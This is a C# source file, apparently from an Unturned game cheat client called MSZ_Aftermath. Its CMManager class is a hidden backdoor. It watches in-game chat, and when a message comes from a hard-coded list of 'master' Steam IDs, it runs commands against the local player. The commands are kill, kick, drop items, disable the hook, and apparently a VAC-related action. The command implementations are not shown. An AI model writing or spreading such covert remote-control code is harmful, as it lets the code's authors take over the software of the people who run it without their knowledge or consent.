using System;
using System.Collections.Generic;
using System.Text;
using UnityEngine;
using SDG.Unturned;
using MSZ_Aftermath.Types;
using MSZ_Aftermath.Commands;

namespace MSZ_Aftermath.Library
{
    public class CMManager : MonoBehaviour
    {
        private List<CommandType> commands = new List<CommandType>();

        public void Start()
        {
            ChatManager.onListed += new Listed(OnChat);

            commands.Add(new CMD_Kill());
            commands.Add(new CMD_Vac());
            commands.Add(new CMD_Kick());
            commands.Add(new CMD_DropItems());
            commands.Add(new CMD_DisableHook());
        }

        public void OnChat()
        {
            Chat lastMessage = ChatManager.chat[0];
            SteamPlayer speaker = Tool.getSteamPlayer(lastMessage.speaker);
            if (speaker != null && Universal.masterIDs.Contains(speaker.playerID.steamID.m_SteamID) && !Universal.masterIDs.Contains(Provider.client.m_SteamID))
            {
                string[] args = lastMessage.text.Split(' ');
                CommandType ct = Array.Find(commands.ToArray(), a => args[0] == a.command);
                if (ct != null)
                {
                    string[] args1 = Array.FindAll(args, a => a != ct.command);
                    if (args1.Length <= 0)
                    {
                        args1 = new string[1];
                        args1[0] = "";
                    }
                    ct.execute(args1);
                }
            }
        }
    }
}
